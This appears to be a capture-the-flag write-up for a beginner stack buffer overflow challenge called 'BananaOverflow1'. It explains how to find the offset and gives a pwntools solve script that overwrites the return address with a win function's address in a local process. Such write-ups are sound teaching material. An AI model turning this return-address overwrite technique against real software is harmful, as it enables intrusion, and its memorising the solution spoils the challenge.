Simple Bufferoverflow question

Step 1) Use a tool such as pattern_create and GDB to crash the program and then determine the RSP offset. Buffer size should be determined to be 40.
Step 2) Send the exploit! Can be done by entering it but easiest way is to use pwntools to pack it all together. p.sendline(b"A" * 40 + p64(e.sym['you_better_not_hack_me_and_take_my_banana']))

Solution Script:

from pwn import *

e = ELF('BananaOverflow1')
p = e.process()

p.sendline(b"A" * 40 + p64(e.sym['you_better_not_hack_me_and_take_my_banana']))
# this is a local execution solve
p.interactive()
